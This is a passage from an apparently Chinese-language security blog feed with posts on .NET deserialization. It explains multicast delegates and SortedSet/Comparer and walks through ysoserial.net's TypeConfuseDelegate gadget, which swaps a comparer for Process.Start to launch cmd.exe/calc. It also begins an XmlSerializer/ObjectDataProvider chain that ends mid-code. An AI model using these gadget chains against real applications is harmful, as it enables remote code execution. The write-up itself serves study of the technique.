MyDelegate myDelegate = new MyDelegate(PrintString);</span><br><span class="line">        MyDelegate myDelegate1 = new MyDelegate(WriteToFile);</span><br><span class="line">        myDelegate += myDelegate1;</span><br><span class="line">        myDelegate(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226095215225.png" alt="image-20240226095215225"></p><p><img src="../images/image-20240226095231589.png" alt="image-20240226095231589"></p><p>其实重点就在于这   是可以进行相加的   把其想象成一个列表  调用的时候会从中依次进行调用</p><p><strong>还可以用MulticastDelegate.Combine(printString, writeFile)的形式。(主要是使用这种方法)</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> s</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintString</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;print <span class="subst">&#123;s&#125;</span> to screen.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WriteToFile</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;write <span class="subst">&#123;s&#125;</span> to file.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyDelegate printString = <span class="keyword">new</span> MyDelegate(PrintString);</span><br><span class="line">        MyDelegate writeFile = <span class="keyword">new</span> MyDelegate(WriteToFile);</span><br><span class="line">        Delegate twoDelegte = MulticastDelegate.Combine(printString, writeFile);</span><br><span class="line">        twoDelegte.DynamicInvoke(<span class="string">&quot;something&quot;</span>);  <span class="comment">//调用函数</span></span><br><span class="line">        Delegate[] delegates = twoDelegte.GetInvocationList();   <span class="comment">//查看存入列表中的函数</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> delegates)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(item.Method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226095516526.png" alt="image-20240226095516526"></p><h3 id="SortedSet和Comparer"><a href="#SortedSet和Comparer" class="headerlink" title="SortedSet和Comparer"></a>SortedSet和Comparer</h3><p>ysoserial.net中链子的样子</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">GetXamlGadget</span>(<span class="params"><span class="built_in">string</span> xaml_payload</span>)</span></span><br><span class="line">       &#123;</span><br><span class="line">           Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">           Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">           IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">           SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line">           <span class="keyword">set</span>.Add(xaml_payload);</span><br><span class="line">           <span class="keyword">set</span>.Add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">           FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">           <span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line">           <span class="comment">// We use XamlReader.Parse() to trigger the xaml execution</span></span><br><span class="line">           invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;(System.Windows.Markup.XamlReader.Parse);</span><br><span class="line">           fi.SetValue(d, invoke_list);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">set</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>其实看起来和我们上面用到的不太一样  </p><p>这里是通过<code>SortedSet&lt;T&gt;</code>和<code>Comparer</code>进行利用的   接下来介绍一下这两个类</p><p>给一个简单的demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BinaryFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ByFileExtension</span> : <span class="title">IComparer</span>&lt;<span class="title">string</span>&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> xExt, yExt;</span><br><span class="line"></span><br><span class="line">        CaseInsensitiveComparer caseiComp = <span class="keyword">new</span> CaseInsensitiveComparer();</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">Compare</span>(<span class="params"><span class="built_in">string</span> x, <span class="built_in">string</span> y</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Parse the extension from the file name.</span></span><br><span class="line">            xExt = x.Substring(x.LastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">            yExt = y.Substring(y.LastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Compare the file extensions.</span></span><br><span class="line">            <span class="built_in">int</span> vExt = caseiComp.Compare(xExt, yExt);</span><br><span class="line">            <span class="keyword">if</span> (vExt != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> vExt;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// The extension is the same,</span></span><br><span class="line">                <span class="comment">// so compare the filenames.</span></span><br><span class="line">                <span class="keyword">return</span> caseiComp.Compare(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(<span class="keyword">new</span> ByFileExtension());</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.c&quot;</span>);</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.b&quot;</span>);</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.a&quot;</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> <span class="keyword">set</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(item.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">test.a</span><br><span class="line">test.b</span><br><span class="line">test.c</span><br></pre></td></tr></table></figure><p>看懂这个demo的话   就会对我们下面yso链子有更好的理解了</p><p><img src="../images/image-20240226100148484.png" alt="image-20240226100148484"></p><ul><li>实现了这个<code>IComparer&lt;string&gt;</code>接口</li><li>重写了这个<code>Compare</code>函数</li></ul><p><img src="../images/image-20240226100353073.png" alt="image-20240226100353073"></p><p>然后将我们的ByFileExtension类放入到SortedSet类中  然后set.Add添加值进去比较</p><p>那么这个是我们自己手动添加的类和比较器  所以在yso是得自动生成  </p><p><img src="../images/image-20240226100555050.png" alt="image-20240226100555050"></p><p>都是必须得满足这两个条件</p><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>会看yso中的构造链</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br></pre></td></tr></table></figure><p>跟进Comparison函数</p><p><img src="../images/image-20240226101018984.png" alt="image-20240226101018984"></p><p>是一个委派函数 </p><p><img src="../images/image-20240226101347624.png" alt="image-20240226101347624"></p><p>这个就是创建了两个Compare函数  </p><p><img src="../images/image-20240226101415467.png" alt="image-20240226101415467"></p><p>而<code>Comparer&lt;T&gt;</code>抽象类实现了<code>IComparer&lt;T&gt;</code>接口 </p><p><img src="../images/image-20240226101439662.png" alt="image-20240226101439662"></p><p>那么这个Create就是创建了实现了 IComparer接口  并有两个Compare方法的一个类   并且放入列表中</p><p>然后又因为我们委派的是Comparison函数</p><p><img src="../images/image-20240226101838201.png" alt="image-20240226101838201"></p><p>如果我们将Process.Start设置为比较器，那么向集合中添加的值就是Process.Start的参数，由此来进行命令执行。在委托中我们提到，委托的方法签名和委托必须一致，而对于<code>SortedSet&lt;string&gt;</code>类来说，其比较函数类型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int Comparison&lt;in T&gt;(T x, T y);</span><br></pre></td></tr></table></figure><p>但是而Process.Start()的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static Process Start(string fileName, string arguments);</span><br></pre></td></tr></table></figure><p>返回类型不一致  一个是Process，一个是int   这样就会导致反序列化失败   那么我们就得借助多播委派来解决这个问题了</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个string的比较器</span></span><br><span class="line">Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line"><span class="comment">// 用两个string的比较器合并为一个多播委托(生成两个Compare函数)</span></span><br><span class="line">Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line"><span class="comment">// Create()函数返回new ComparisonComparer&lt;T&gt;(d) (生成一个类)</span></span><br><span class="line">IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line"><span class="comment">// 将ComparisonComparer赋值给SortedSet的比较器</span></span><br><span class="line">SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line"><span class="comment">// set.Add(&quot;cmd.exe&quot;)</span></span><br><span class="line"><span class="keyword">set</span>.Add(inputArgs.CmdFileName);</span><br><span class="line"><span class="comment">// set.Add(&quot;calc&quot;)</span></span><br><span class="line"><span class="keyword">set</span>.Add(inputArgs.CmdArguments);</span><br><span class="line"><span class="comment">// 反射修改_invocationList</span></span><br><span class="line">FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line"><span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line"><span class="comment">// 修改_invocationList 添加 Process::Start(string, string) 修改第二个Compare函数为Process.Start</span></span><br><span class="line">invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">string</span>, Process&gt;(Process.Start);</span><br><span class="line">fi.SetValue(d, invoke_list);</span><br></pre></td></tr></table></figure><p>那么为什么多播委派能解决这个签名不一致的问题   原作者给出的解释</p><blockquote><p>The only weird thing about this code is TypeConfuseDelegate. It’s a long standing issue that .NET delegates don’t always enforce their type signature, especially the return value. In this case we create a two entry multicast delegate (a delegate which will run multiple single delegates sequentially), setting one delegate to String::Compare which returns an int, and another to Process::Start which returns an instance of the Process class. This works, even when deserialized and invokes the two separate methods. It will then return the created process object as an integer, which just means it will return the pointer to the instance of the process object.</p></blockquote><p>简单来讲就是 多播委托传递的是指针</p><p>先在SortedSet中触发OnDeserialization函数   然后调用Add方法</p><p><img src="../images/image-20240226103010401.png" alt="image-20240226103010401"></p><p>跟进add方法后 发现会多次调用我们的Compare方法   但是Compare方法已经被我们反射修改为Process.Start(string,string)</p><p><strong>(准确来说是第二次  因为我们是修改第二个Compare方法)</strong></p><p><img src="../images/image-20240226102833194.png" alt="image-20240226102833194"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/&quot;&gt;ht</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-02</title>
    <link href="https://ke1nys.github.io/posts/3df24b8d.html"/>
    <id>https://ke1nys.github.io/posts/3df24b8d.html</id>
    <published>2024-02-22T08:45:58.000Z</published>
    <updated>2024-02-26T13:07:35.444Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md</a></p><p><a href="https://boogipop.com/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/">https://boogipop.com/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/</a></p><h2 id="XmlSerializer"><a href="#XmlSerializer" class="headerlink" title="XmlSerializer"></a>XmlSerializer</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">XmlRoot</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">XmlElement</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">XmlElement</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">XmlArray(<span class="string">&quot;Items&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> Order[] OrderedItems;</span><br><span class="line">        [<span class="meta">XmlAttribute</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ClassName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Order</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> OrderID;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person p = <span class="keyword">new</span> Person();</span><br><span class="line">            p.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            p.Age = <span class="number">12</span>;</span><br><span class="line">            Order order = <span class="keyword">new</span> Order();</span><br><span class="line">            order.OrderID = <span class="number">123</span>;</span><br><span class="line">            Order order1 = <span class="keyword">new</span> Order();</span><br><span class="line">            order.OrderID = <span class="number">456</span>;</span><br><span class="line">            Order[] orders = <span class="keyword">new</span> Order[] &#123; order, order1 &#125;;</span><br><span class="line">            p.OrderedItems = orders;</span><br><span class="line">            p.ClassName = <span class="string">&quot;classname&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            xmlSerializer.Serialize(writer, p);</span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出xml</span></span><br><span class="line">            Console.WriteLine(Encoding.UTF8.GetString(memoryStream.ToArray()));</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            Person p1 = (Person)xmlSerializer.Deserialize(memoryStream);</span><br><span class="line">            Console.WriteLine(p1.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xml里的参数其实问题不大  重点是关注序列化想要的条件</p><ul><li>序列化类需要是public</li><li>需要个writer 将序列化的数据写入内存流中</li><li>XmlSerializer 得传参进去  参数是序列化类的类型</li></ul><p>(不加的就是以二进制的形式进行传输  就是.bin文件)</p><p>输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Person xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; ClassName=&quot;classname&quot;&gt;</span><br><span class="line">  &lt;Items&gt;</span><br><span class="line">    &lt;Order&gt;</span><br><span class="line">      &lt;OrderID&gt;456&lt;/OrderID&gt;</span><br><span class="line">    &lt;/Order&gt;</span><br><span class="line">    &lt;Order&gt;</span><br><span class="line">      &lt;OrderID&gt;0&lt;/OrderID&gt;</span><br><span class="line">    &lt;/Order&gt;</span><br><span class="line">  &lt;/Items&gt;</span><br><span class="line">  &lt;Age&gt;12&lt;/Age&gt;</span><br><span class="line">  &lt;Name&gt;jack&lt;/Name&gt;</span><br><span class="line">&lt;/Person&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他会将我们的对象Object序列化为Xml文本格式，之后反序列化的话就会转换回Person类。<br>上述memory流对象在序列化后position会蹦到文件的末尾，我们需要给他调整为0再进行反序列化才行</p><h2 id="ObjectDataProvider"><a href="#ObjectDataProvider" class="headerlink" title="ObjectDataProvider"></a>ObjectDataProvider</h2><p>这个类我们在01的时候介绍过  其就是可以直接调用到Process然后执行命令</p><p>(刚开始直接用的时候会报错  得导入包才行)</p><p><img src="../images/image-20240224210637750.png" alt="image-20240224210637750"></p><p>刚开始这里的时候会报错  说找不到这个包  <code>ObjectDataProvider</code>就是在这个里面的  所以我们要手动导入一下</p><p><img src="../images/image-20240224210801745.png" alt="image-20240224210801745"></p><p>选择 PresentationFramework依赖  并且添加进去</p><p><img src="../images/image-20240224211000138.png" alt="image-20240224211000138"></p><p>回到正轨上   当我们直接执行上述代码时  calc命令是能直接执行成功  但是xml内容却不会输出出来</p><p><img src="../images/image-20240224211145982.png" alt="image-20240224211145982"></p><p>其实就是因为我们在初始化<code>XmlSerializer</code>这个类的时候  确定的类型是<code>ObjectDataProvider</code></p><p>但在序列化的时候却识别不出来<code>ObjectDataProvider</code>  所以就会导致报错  这样的话就不能反序列化执行了</p><p>我们可以使用<code>ExpandedWrapper</code>类来解决这个问题  </p><p><img src="../images/image-20240224212028497.png" alt="image-20240224212028497"></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Data.Services.Internal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">XmlRoot</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">XmlAttribute</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ClassName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Evil</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Process process = <span class="keyword">new</span> Process();</span><br><span class="line">            process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            process.StartInfo.Arguments = <span class="string">&quot;/c &quot;</span> + cmd;</span><br><span class="line">            process.Start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            ExpandedWrapper&lt;Person, 